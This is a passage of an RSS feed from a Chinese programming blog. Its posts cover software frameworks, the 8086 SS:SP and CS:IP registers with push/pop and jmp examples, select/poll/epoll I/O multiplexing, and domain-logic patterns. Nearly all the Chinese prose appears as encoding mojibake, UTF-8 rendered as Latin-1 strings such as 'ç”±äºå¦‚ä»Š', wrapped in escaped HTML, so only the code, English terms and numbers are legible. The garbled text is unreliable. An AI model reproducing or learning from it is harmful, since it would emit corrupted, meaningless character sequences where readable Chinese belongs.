&lt;p&gt;ç”±äºå¦‚ä»Šè½¯ä»¶è¡Œä¸šçš„å˜åŒ–ï¼Œè½¯ä»¶å·¥ç¨‹å¸ˆä»¬å·²ç»ä¸èƒ½ä»…ä»…åªåœ¨åº•å±‚å·¥ä½œäº†ï¼Œåº”ç”¨å±‚çš„å‘å±•ä¹Ÿçªé£çŒ›è¿›ã€‚
å„ç§è½¯ä»¶æ¶æ„çš„å‡ºç°åº”æ¥ä¸æš‡ã€‚&lt;/p&gt;
&lt;p&gt;æ¡†æ¶æœ€åˆæ˜¯ä¸ºäº†è§£å†³é‡å¤è€Œå¤æ‚çš„å·¥ä½œè€Œè¯ç”Ÿå‡ºæ¥çš„äº§ç‰©ã€‚
å¸®åŠ©æˆ‘ä»¬ä¸å¿…å†å†™é‡å¤çš„ä»£ç ï¼Œåªéœ€è¦å…³å¿ƒä¸šåŠ¡é€»è¾‘ã€‚&lt;/p&gt;
&lt;p&gt;æ¡†æ¶å¯ä»¥è¯´æ˜¯ä¸ºäº†åº”ç”¨å±‚çš„è½¯ä»¶å·¥ç¨‹å¸ˆè€Œè®¾è®¡çš„ã€‚ä»–ä»¬å¾€å¾€ä¸ä¼šå…³å¿ƒæ›´ç»†ç²’åº¦çš„å·¥ä½œã€‚ä»–ä»¬åªè¿½æ±‚ç¨³å®šçš„åº”ç”¨å’Œä¼ä¸šæ¶æ„ã€‚&lt;/p&gt;
&lt;p&gt;To be continued&amp;hellip;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>SS:SPé¸¡ä½ å¤ªç¾å­˜å™¨</title>
        <link>https://sdttttt.github.io/p/sssp%E9%B8%A1%E4%BD%A0%E5%A4%AA%E7%BE%8E%E5%AD%98%E5%99%A8/</link>
        <pubDate>Mon, 06 Apr 2020 16:38:01 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/sssp%E9%B8%A1%E4%BD%A0%E5%A4%AA%E7%BE%8E%E5%AD%98%E5%99%A8/</guid>
        <description>&lt;p&gt;å¦‚ä»Šçš„CPUéƒ½æœ‰æä¾›æ ˆæœºåˆ¶ï¼Œ8086ä¹Ÿä¸ä¾‹å¤–ã€‚&lt;/p&gt;
&lt;p&gt;8086æä¾›çš„æœ€åŸºæœ¬çš„ä¸¤ä¸ªæŒ‡ä»¤å°±æ˜¯&lt;code&gt;push&lt;/code&gt; and &lt;code&gt;pop&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;push ax ;å°†å¯„å­˜å™¨axä¸­çš„æ•°æ®é€å…¥æ ˆé¡¶
pop ax ;å°†æ ˆé¡¶çš„æ•°æ®é€å…¥ax
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æˆ‘ä»¬çŸ¥é“CS:IPå¯„å­˜å™¨å­˜æ”¾äº†ä¸‹ä¸€æ¡æŒ‡ä»¤çš„æ®µåœ°å€å’Œåç§»åœ°å€ï¼Œé‚£ä¹ˆCPUæ˜¯å¦‚ä½•çŸ¥é“æ ˆé¡¶åœ¨å“ªå‘ï¼Ÿ
æ˜¾ç„¶ä¹Ÿæœ‰ä¸¤ä¸ªå¯„å­˜å™¨ä¸“é—¨å­˜æ”¾æ ˆé¡¶çš„åœ°å€ï¼Œé‚£å°±æ˜¯SS:SPå¯„å­˜å™¨ï¼ŒSS = æ®µåœ°å€ï¼Œ SP = åç§»åœ°å€&lt;/p&gt;
&lt;p&gt;ä»»æ„æ—¶åˆ»ï¼ŒSS:SPéƒ½æŒ‡å‘æ ˆé¡¶å…ƒç´ ã€‚&lt;code&gt;push&lt;/code&gt;å’Œ&lt;code&gt;pop&lt;/code&gt;æŒ‡ä»¤æ‰§è¡Œæ—¶CPUå°†ä»SSå’ŒSPä¸­è·å¾—æ ˆé¡¶çš„åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;push&lt;/code&gt; æœ‰2æ­¥:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SP -= 2 SS:SPæŒ‡å‘æ ˆé¡¶å‰é¢çš„å•å…ƒï¼Œä»¥è¿™ä¸ªä½ç½®ä¸ºæ–°æ ˆã€‚&lt;/li&gt;
&lt;li&gt;å°†AXä¸­çš„å†…å®¹é€å…¥ SS:SP æ‰€æŒ‡çš„ä½ç½®.&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;10000H  |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______| 
        |_______| 
1000EH  |__23___| &amp;lt;= SS:SP
1000FH  |__01___|
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;10000H  |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______| &amp;lt;= SS:SP: æ¢ä¸ªä½ç½®
        |_______| 
1000EH  |__23___| 
1000FH  |__01___|
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;10000H  |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|  ;æ¥è‡ªaxå¯„å­˜å™¨çš„æ•°æ®
        |__54___| &amp;lt;= SS:SP: æ¢ä¸ªä½ç½®
        |__11___| 
1000EH  |__23___| 
1000FH  |__01___|
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;p&gt;å‡è®¾ 10000H -&amp;gt; 1000FH è¿™æ®µç©ºé—´æ˜¯æ ˆï¼Œé‚£ä¹ˆæ ˆç©ºæ—¶ï¼ŒSS:SPåœ¨å‘ï¼Ÿ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;10000H  |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______| 
1000EH  |_______| 
1000FH  |_______| &amp;lt;= SS:SP: æˆ‘åœ¨è¿™ï¼Ÿ
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;10000H  |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______|
        |_______| 
1000EH  |_______| 
1000FH  |_______| 
10010H  |_______| &amp;lt;= SS:SP: å…¶å®çˆ·åœ¨è¿™é‡Œã€‚
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è‡³äºä¸ºä»€ä¹ˆåªè¦æƒ³æƒ³ &lt;code&gt;SP -= 2&lt;/code&gt; ä½ å°±çŸ¥é“äº†ã€‚&lt;/p&gt;
&lt;h1 id=&#34;å…³äºçˆ†æ ˆ&#34;&gt;å…³äºçˆ†æ ˆ&lt;/h1&gt;
&lt;p&gt;æ ˆä¸€æ—¦çˆ†äº†ï¼ŒSS:SPå°±ä¼šæŒ‡åˆ°åˆ«çš„åœ°æ–¹å»ã€‚
è¿™ä¹ˆä¸€æƒ³CPUåº”è¯¥ä¼šçŸ¥é“æ ˆé¡¶åœ¨å“ªé‡Œã€‚&lt;/p&gt;
&lt;p&gt;æ¯æ¬¡&lt;code&gt;push&lt;/code&gt;,&lt;code&gt;pop&lt;/code&gt;éƒ½ä¼šæ£€æŸ¥æ ˆé¡¶å’Œæ ˆåº•çš„ä½ç½®ï¼Œä¿è¯æ ˆä¸ä¼šè¶…ã€‚è¿™ä¹ˆä¸€æƒ³ç¾æ»‹æ»‹ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶è€Œï¼Œ8086CPUå¹¶æ²¡æœ‰åšè¿™æ ·çš„è®¾è®¡ã€‚
å®ƒåªçŸ¥é“æ ˆé¡¶åœ¨å“ªé‡Œã€‚ä¸çŸ¥é“æ ˆæœ‰å¤šå¤§ã€‚&lt;/p&gt;
&lt;p&gt;æ¢ä¸ªè¯´æ³•å°±æ˜¯ï¼š&lt;strong&gt;åªçŸ¥é“ä¸‹ä¸€æ¡æŒ‡ä»¤åœ¨å“ªé‡Œï¼Œè€Œä¸çŸ¥é“è¦å¤„ç†çš„æŒ‡ä»¤æœ‰å¤šå°‘æ¡ã€‚&lt;/strong&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>CSIPé¸¡ä½ å¤ªç¾å­˜å™¨</title>
        <link>https://sdttttt.github.io/p/csip%E9%B8%A1%E4%BD%A0%E5%A4%AA%E7%BE%8E%E5%AD%98%E5%99%A8/</link>
        <pubDate>Mon, 06 Apr 2020 15:35:44 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/csip%E9%B8%A1%E4%BD%A0%E5%A4%AA%E7%BE%8E%E5%AD%98%E5%99%A8/</guid>
        <description>&lt;p&gt;ä¹‹å‰åˆšå­¦çš„æ—¶å€™å¯¹è¿™ä¸ªç©æ„éŸ³å“æ²¡é‚£ä¹ˆæ·±åˆ»ï¼Œç°åœ¨å†å­¦ï¼Œæ„Ÿè§‰å¾ˆä¸ä¸€æ ·äº†ã€‚&lt;/p&gt;
&lt;p&gt;CSä¸ºä»£ç æ®µå¯„å­˜å™¨ï¼ŒIPä¸ºæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ã€‚
è®¾CS = M, IP = N, 8086CPUå°†ä» &lt;code&gt;M Ã— 16 + N&lt;/code&gt; å¤„è¯»å–æŒ‡ä»¤å¹¶è¿›è¡Œã€‚&lt;/p&gt;
&lt;p&gt;ä¹Ÿå¯ä»¥è¿™æ ·è¡¨è¿°ï¼š &lt;strong&gt;8086CPUä¸­ï¼Œä»»æ„æ—¶åˆ»ï¼ŒCPUéƒ½ä¼šå°†CS:IPæŒ‡å‘çš„å†…å®¹åšä¸ºæ‰§è¡ŒæŒ‡ä»¤.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æ‰§è¡Œæµç¨‹:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;åˆå§‹çŠ¶æ€: CS = 2000H, IP = 0000H&lt;/li&gt;
&lt;li&gt;CS:IP å†…å®¹é€å…¥åœ°å€åŠ æ³•å™¨ï¼Œ2000H Ã— 16 + 0000H = 20000H&lt;/li&gt;
&lt;li&gt;åœ°å€åŠ æ³•å™¨è®¡ç®—å‡ºç‰©ç†åœ°å€20000Håå°†ç»“æœé€å…¥è¾“å…¥è¾“å‡ºç”µè·¯.&lt;/li&gt;
&lt;li&gt;è¾“å…¥è¾“å‡ºç”µè·¯å°†ç‰©ç†åœ°å€20000Hé€åˆ°åœ°å€æ€»çº¿ã€‚&lt;/li&gt;
&lt;li&gt;å†…å­˜å°†ç‰©ç†åœ°å€20000Hä¸Šå­˜æ”¾çš„æœºå™¨æŒ‡ä»¤Xé€šè¿‡æ•°æ®æ€»çº¿é€å…¥CPU.&lt;/li&gt;
&lt;li&gt;è¾“å…¥è¾“å‡ºç”µè·¯å°†æœºå™¨æŒ‡ä»¤Xé€å…¥æŒ‡ä»¤ç¼“å†²å™¨ã€‚&lt;/li&gt;
&lt;li&gt;å¯„å­˜å™¨IPçš„å€¼è‡ªåŠ¨å¢åŠ ã€‚&lt;/li&gt;
&lt;li&gt;ä»¥æ­¤ç±»æ¨&amp;hellip;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;å½“8086CPUåŠ ç‚¹æˆ–è€…å¤ä½åï¼ŒCS = FFFFH, IP = 0000H,ä¹Ÿå°±æ˜¯CPUæ¸…æ™¨èµ·åºŠåšçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯å»æ‰§è¡ŒFFFF0Hå†…å­˜å•å…ƒä¸­å­˜æ”¾çš„æœºå™¨æŒ‡ä»¤ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä¿®æ”¹csip&#34;&gt;ä¿®æ”¹CS:IP&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;mov&lt;/code&gt;æŒ‡ä»¤èƒ½å¸®æˆ‘ä»¬å°†å€¼é€å…¥å¯„å­˜å™¨ã€‚ä½†æ˜¯ï¼Œå®ƒä¸èƒ½ç”¨äºä¿®æ”¹CS:IPï¼ŒåŸå› å¾ˆç®€å•8086å‡ºäºè®¾è®¡è€ƒé‡ä¸å…è®¸ã€‚
èƒ½ä¿®æ”¹CS:IPçš„æŒ‡ä»¤ç»Ÿç§°ä¸º&lt;code&gt;è½¬ç§»æŒ‡ä»¤&lt;/code&gt;ï¼ˆä»¥åæˆ‘ä»¬æ·±å…¥ç ”ç©¶ï¼‰,ç°åœ¨æˆ‘å­¦ä¹ ç¬¬ä¸€ä¸ªå¯ä»¥ä¿®æ”¹CS:IPå¯„å­˜å™¨çš„æŒ‡ä»¤ï¼Œ&lt;code&gt;jmp&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;è‹¥æƒ³åŒæ—¶ä¿®æ”¹CS:IPå¯„å­˜å™¨,å¯ä»¥ç”¨&lt;code&gt;jmp æ®µåœ°å€, åç§»åœ°å€&lt;/code&gt;çš„æŒ‡ä»¤æ¥å®Œæˆã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;nf&#34;&gt;jmp&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;AE3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;;æ‰§è¡Œå: CS = 2AE3H IP = 0003H, CPU å°†ä»è¿™2AE33H å¤„è¯»å–æŒ‡ä»¤
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœåªæƒ³ä¿®æ”¹IPå¯„å­˜å™¨, å¯ä»¥ç”¨&lt;code&gt;jmp å¯„å­˜å™¨&lt;/code&gt;çš„æŒ‡ä»¤æ¥å®Œæˆ.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;nf&#34;&gt;jmp&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ax&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç±»ä¼¼, &lt;code&gt;mov IP, ax&lt;/code&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>MultiplexingIO</title>
        <link>https://sdttttt.github.io/p/multiplexingio/</link>
        <pubDate>Mon, 06 Apr 2020 12:42:26 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/multiplexingio/</guid>
        <description>&lt;p&gt;å…¶å®â€œI/Oå¤šè·¯å¤ç”¨â€è¿™ä¸ªå‘çˆ¹ç¿»è¯‘å¯èƒ½æ˜¯è¿™ä¸ªæ¦‚å¿µåœ¨ä¸­æ–‡é‡Œé¢å¦‚æ­¤éš¾ç†è§£çš„åŸå› ã€‚æ‰€è°“çš„I/Oå¤šè·¯
å¤ç”¨åœ¨è‹±æ–‡ä¸­å…¶å®å« I/O multiplexing. å¦‚æœä½ æœç´¢multiplexingå•¥æ„æ€,åŸºæœ¬ä¸Šéƒ½ä¼šå‡ºè¿™ä¸ªå›¾:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sdttttt.github.io/multiplexIO/1.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;äºæ˜¯å¤§éƒ¨åˆ†äººéƒ½ç›´æ¥è”æƒ³åˆ°&amp;quot;ä¸€æ ¹ç½‘çº¿,å¤šä¸ªsockå¤ç”¨&amp;quot; è¿™ä¸ªæ¦‚å¿µ,åŒ…æ‹¬ä¸Šé¢çš„å‡ ä¸ªå›ç­”, å…¶å®ä¸
ç®¡ä½ ç”¨å¤šè¿›ç¨‹è¿˜æ˜¯I/Oå¤šè·¯å¤ç”¨, ç½‘çº¿éƒ½åªæœ‰ä¸€æ ¹å¥½ä¼ã€‚&lt;strong&gt;å¤šä¸ªSockå¤ç”¨ä¸€æ ¹ç½‘çº¿è¿™ä¸ªåŠŸèƒ½æ˜¯åœ¨å†…æ ¸
+é©±åŠ¨å±‚å®ç°çš„.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;é‡è¦çš„äº‹æƒ…å†è¯´ä¸€é: I/O multiplexing è¿™é‡Œé¢çš„ multiplexing æŒ‡çš„å…¶å®æ˜¯åœ¨å•ä¸ªçº¿ç¨‹é€šè¿‡è®°
å½•è·Ÿè¸ªæ¯ä¸€ä¸ªSock(I/Oæµ)çš„çŠ¶æ€(å¯¹åº”ç©ºç®¡å¡”é‡Œé¢çš„Fight progress stripæ§½)æ¥åŒæ—¶ç®¡ç†å¤šä¸ªI/O
æµ.&lt;/strong&gt; å‘æ˜å®ƒçš„åŸå› ,æ˜¯å°½é‡å¤šçš„æé«˜æœåŠ¡å™¨çš„ååèƒ½åŠ›ã€‚&lt;/p&gt;
&lt;p&gt;æ˜¯ä¸æ˜¯å¬èµ·æ¥å¥½æ‹—å£,çœ‹ä¸ªå›¾å°±æ‡‚äº†.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sdttttt.github.io/multiplexIO/2.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;åœ¨åŒä¸€ä¸ªçº¿ç¨‹é‡Œé¢, é€šè¿‡æ‹¨å¼€å…³çš„æ–¹å¼,æ¥åŒæ—¶ä¼ è¾“å¤šä¸ªI/Oæµ, (å­¦è¿‡EEçš„äººç°åœ¨å¯ä»¥ç«™å‡ºæ¥ä¹‰æ­£
ä¸¥è¾è¯´è¿™ä¸ªå«â€œæ—¶åˆ†å¤ç”¨â€äº†)ã€‚&lt;/p&gt;
&lt;p&gt;ä»€ä¹ˆ,ä½ è¿˜æ²¡æœ‰ææ‡‚ â€œä¸€ä¸ªè¯·æ±‚åˆ°æ¥äº†,nginxä½¿ç”¨epollæ¥æ”¶è¯·æ±‚çš„è¿‡ç¨‹æ˜¯æ€æ ·çš„â€, å¤šçœ‹çœ‹è¿™ä¸ª
å›¾å°±äº†è§£äº†ã€‚æé†’ä¸‹,ngnixä¼šæœ‰å¾ˆå¤šé“¾æ¥è¿›æ¥, epollä¼šæŠŠä»–ä»¬éƒ½ç›‘è§†èµ·æ¥,ç„¶ååƒæ‹¨å¼€å…³ä¸€æ ·,
è°æœ‰æ•°æ®å°±æ‹¨å‘è°,ç„¶åè°ƒç”¨ç›¸åº”çš„ä»£ç å¤„ç†ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;äº†è§£è¿™ä¸ªåŸºæœ¬çš„æ¦‚å¿µä»¥å,å…¶ä»–çš„å°±å¾ˆå¥½è§£é‡Šäº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;select, poll, epoll éƒ½æ˜¯I/Oå¤šè·¯å¤ç”¨çš„å…·ä½“çš„å®ç°,ä¹‹æ‰€ä»¥æœ‰è¿™ä¸‰ä¸ªé¬¼å­˜åœ¨,å…¶å®æ˜¯ä»–ä»¬å‡ºç°æ˜¯æœ‰
å…ˆåé¡ºåºçš„ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I/Oå¤šè·¯å¤ç”¨è¿™ä¸ªæ¦‚å¿µè¢«æå‡ºæ¥ä»¥å, selectæ˜¯ç¬¬ä¸€ä¸ªå®ç° (1983 å·¦å³åœ¨BSDé‡Œé¢å®ç°çš„)ã€‚&lt;/p&gt;
&lt;p&gt;select è¢«å®ç°ä»¥å,å¾ˆå¿«å°±æš´éœ²å‡ºäº†å¾ˆå¤šé—®é¢˜ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;select ä¼šä¿®æ”¹ä¼ å…¥çš„å‚æ•°æ•°ç»„,è¿™ä¸ªå¯¹äºä¸€ä¸ªéœ€è¦è°ƒç”¨å¾ˆå¤šæ¬¡çš„å‡½æ•°,æ˜¯éå¸¸ä¸å‹å¥½çš„ã€‚&lt;/li&gt;
&lt;li&gt;select å¦‚æœä»»ä½•ä¸€ä¸ªsock(I/O stream)å‡ºç°äº†æ•°æ®,select ä»…ä»…ä¼šè¿”å›,ä½†æ˜¯å¹¶ä¸ä¼šå‘Šè¯‰ä½ æ˜¯é‚£
ä¸ªsockä¸Šæœ‰æ•°æ®,äºæ˜¯ä½ åªèƒ½è‡ªå·±ä¸€ä¸ªä¸€ä¸ªçš„æ‰¾,10å‡ ä¸ªsockå¯èƒ½è¿˜å¥½,è¦æ˜¯å‡ ä¸‡çš„sockæ¯æ¬¡&lt;/li&gt;
&lt;li&gt;select ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„,å¦‚æœä½ æŠŠä¸€ä¸ªsockåŠ å…¥åˆ°select, ç„¶åçªç„¶å¦å¤–ä¸€ä¸ªçº¿ç¨‹å‘ç°,å°¼ç›,è¿™
ä¸ªsockä¸ç”¨,è¦æ”¶å›ã€‚å¯¹ä¸èµ·,è¿™ä¸ªselect ä¸æ”¯æŒçš„,å¦‚æœä½ ä¸§å¿ƒç—…ç‹‚çš„ç«Ÿç„¶å…³æ‰è¿™ä¸ªsock,
selectçš„æ ‡å‡†è¡Œä¸ºæ˜¯ã€‚ã€‚å‘ƒã€‚ã€‚ä¸å¯é¢„æµ‹çš„, è¿™ä¸ªå¯æ˜¯å†™åœ¨æ–‡æ¡£ä¸­çš„å“¦.&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;â€œIf a file descriptor being monitored by select() is closed in another thread, the result is
unspecified.â€&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;äºæ˜¯14å¹´ä»¥å(1997å¹´)ä¸€å¸®äººåˆå®ç°äº†poll, poll ä¿®å¤äº†selectçš„å¾ˆå¤šé—®é¢˜,æ¯”å¦‚:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;poll å»æ‰äº†1024ä¸ªé“¾æ¥çš„é™åˆ¶,äºæ˜¯è¦å¤šå°‘é“¾æ¥å‘¢, ä¸»äººä½ å¼€å¿ƒå°±å¥½ã€‚&lt;/li&gt;
&lt;li&gt;poll ä»è®¾è®¡ä¸Šæ¥è¯´,ä¸å†ä¿®æ”¹ä¼ å…¥æ•°ç»„,ä¸è¿‡è¿™ä¸ªè¦çœ‹ä½ çš„å¹³å°äº†,æ‰€ä»¥è¡Œèµ°æ±Ÿæ¹–,è¿˜æ˜¯å°å¿ƒä¸º
å¦™.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;å…¶å®æ‹–14å¹´é‚£ä¹ˆä¹…ä¹Ÿä¸æ˜¯æ•ˆç‡é—®é¢˜, è€Œæ˜¯é‚£ä¸ªæ—¶ä»£çš„ç¡¬ä»¶å®åœ¨å¤ªå¼±,ä¸€å°æœåŠ¡å™¨å¤„ç†1åƒå¤šä¸ªé“¾æ¥
ç®€ç›´å°±æ˜¯ç¥ä¸€æ ·çš„å­˜åœ¨äº†,selectå¾ˆé•¿æ®µæ—¶é—´å·²ç»æ»¡è¶³éœ€æ±‚ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;äºæ˜¯5å¹´ä»¥å, åœ¨2002, å¤§ç¥ Davide Libenzi å®ç°äº†epoll.&lt;/p&gt;
&lt;p&gt;epoll å¯ä»¥è¯´æ˜¯I/O å¤šè·¯å¤ç”¨æœ€æ–°çš„ä¸€ä¸ªå®ç°,epoll ä¿®å¤äº†poll å’Œselectç»å¤§éƒ¨åˆ†é—®é¢˜, æ¯”å¦‚:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;epoll ç°åœ¨æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚&lt;/li&gt;
&lt;li&gt;epoll ç°åœ¨ä¸ä»…å‘Šè¯‰ä½ sockç»„é‡Œé¢æ•°æ®,è¿˜ä¼šå‘Šè¯‰ä½ å…·ä½“å“ªä¸ªsockæœ‰æ•°æ®,ä½ ä¸ç”¨è‡ªå·±å»æ‰¾äº†ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¯æ˜¯epoll æœ‰ä¸ªè‡´å‘½çš„ç¼ºç‚¹ã€‚ã€‚åªæœ‰linuxæ”¯æŒã€‚æ¯”å¦‚BSDä¸Šé¢å¯¹åº”çš„å®ç°æ˜¯kqueueã€‚&lt;/p&gt;
&lt;p&gt;å…¶å®æœ‰äº›å›½å†…çŸ¥åå‚å•†æŠŠepollä»å®‰å“é‡Œé¢è£æ‰è¿™ç§è„‘æ®‹çš„äº‹æƒ…æˆ‘ä¼šä¸»åŠ¨å‘Šè¯‰ä½ å˜›ã€‚ä»€ä¹ˆ,ä½ è¯´æ²¡äºº
ç”¨å®‰å“åšæœåŠ¡å™¨,å°¼ç›ä½ æ˜¯çœ‹ä¸èµ·p2pè½¯ä»¶äº†å•¦ã€‚&lt;/p&gt;
&lt;p&gt;è€Œngnix çš„è®¾è®¡åŸåˆ™é‡Œé¢, å®ƒä¼šä½¿ç”¨ç›®æ ‡å¹³å°ä¸Šé¢æœ€é«˜æ•ˆçš„I/Oå¤šè·¯å¤ç”¨æ¨¡å‹å’¯,æ‰€ä»¥æ‰ä¼šæœ‰è¿™ä¸ª
è®¾ç½®ã€‚ä¸€èˆ¬æƒ…å†µä¸‹,å¦‚æœå¯èƒ½çš„è¯,å°½é‡éƒ½ç”¨epoll/kqueueå§ã€‚&lt;/p&gt;
</description>
        </item>
        <item>
        <title>é¢†åŸŸé€»è¾‘çš„ç»„ç»‡æ¨¡å¼</title>
        <link>https://sdttttt.github.io/p/%E9%A2%86%E5%9F%9F%E9%80%BB%E8%BE%91%E7%9A%84%E7%BB%84%E7%BB%87%E6%A8%A1%E5%BC%8F/</link>
        <pubDate>Fri, 03 Apr 2020 20:58:28 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/%E9%A2%86%E5%9F%9F%E9%80%BB%E8%BE%91%E7%9A%84%E7%BB%84%E7%BB%87%E6%A8%A1%E5%BC%8F/</guid>
        <description>&lt;p&gt;ç›®å‰é¢†åŸŸé€»è¾‘çš„ç»„ç»‡æ¨¡å¼åˆ†ä¸ºä¸‰ç§ï¼Œâ€œäº‹åŠ¡è„šæœ¬â€ï¼Œâ€œé¢†åŸŸæ¨¡å‹â€ ä»¥åŠ â€œè¡¨æ¨¡å—â€ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;äº‹åŠ¡è„šæœ¬&lt;/code&gt;ç±»ä¼¼äº&lt;code&gt;é¢å‘è¿‡ç¨‹&lt;/code&gt;ç¼–ç¨‹ï¼Œäº‹åŠ¡è„šæœ¬æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å®ƒæ˜¯ä¸€ç§å¤§å¤šæ•°è½¯ä»¶å·¥ç¨‹å¸ˆéƒ½èƒ½ç†è§£çš„ç®€å•è¿‡ç¨‹æ¨¡å‹ã€‚&lt;/li&gt;
&lt;li&gt;å®ƒèƒ½å’Œä¸€ä¸ªè¡Œæ•°æ®å…¥å£æˆ–è¡¨æ•°æ®å…¥å£ç®€å•çš„æ•°æ®æºå¾ˆå¥½çš„åä½œã€‚&lt;/li&gt;
&lt;li&gt;éå¸¸å®¹æ˜“è®¾å®šäº‹åŠ¡çš„è¾¹ç•Œã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¸€ä¸ªç»„æ•°æ®æºæ“ä½œä¾¿æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„äº‹åŠ¡è„šæœ¬ã€‚
å½“ç„¶äº‹åŠ¡è„šæœ¬ä¹Ÿå­˜åœ¨å¾ˆå¤§çš„ç¼ºé™·ï¼Œå½“é¢†åŸŸé€»è¾‘å¼€å§‹å˜å¾—å¤æ‚æ—¶ï¼Œè¿™äº›ç¼ºç‚¹å°±å¼€å§‹æš´éœ²å‡ºæ¥ã€‚
å½“å‡ ä¸ªäº‹åŠ¡è¦æ‰§è¡Œç±»ä¼¼çš„é€»è¾‘æ—¶ï¼Œé€šå¸¸å‡ ä¸ªè„šæœ¬ä¸­ä¼šå«æœ‰æŸäº›ç›¸åŒçš„ä»£ç ã€‚
é€šè¿‡å°†è¿™äº›ä»£ç æå–å‡ºæ¥ï¼Œæ¥å½¢æˆå…¬å…±çš„å­ä¾‹ç¨‹ï¼Œæ¥æ¶ˆé™¤è¿™ç§æƒ…å†µã€‚
ä½†æ˜¯ï¼Œå¾ˆå¤šæ—¶å€™æ¶ˆé™¤å‰¯æœ¬ä¼šå˜å¾—æ£˜æ‰‹ï¼Œè€Œæ£€æµ‹å‰¯æœ¬åˆ™æ›´å›°éš¾ï¼Œå€’æ˜¯æ¶ˆé™¤å‰¯æœ¬åçš„ç¨‹åºåè€Œæ¯”ä»¥å‰è¿˜è¦æ‚ä¹±æ— ç« ï¼Œéš¾ä»¥ç»´æŠ¤ã€‚&lt;/p&gt;
&lt;p&gt;å¤æ‚çš„é¢†åŸŸé€»è¾‘ï¼Œå¿…ç„¶è¦å¼•å…¥å¯¹è±¡ï¼Œè§£å†³å‰é¢æè¿°é—®é¢˜çš„é¢å‘å¯¹è±¡æ–¹æ³•å°±æ˜¯&lt;code&gt;é¢†åŸŸæ¨¡å‹&lt;/code&gt;ã€‚
ä¸€ä¸ªå†…å®¹ç®¡ç†ç³»ç»Ÿä¼šæœ‰ç”¨æˆ·ï¼Œæ–‡ç« ç­‰ç±»ï¼Œè¿›è¡Œé‰´æƒï¼Œä»¥åŠå†™å…¥ç­‰é€»è¾‘å‡ç½®äºé¢†åŸŸæ¨¡å‹ä¸­ã€‚
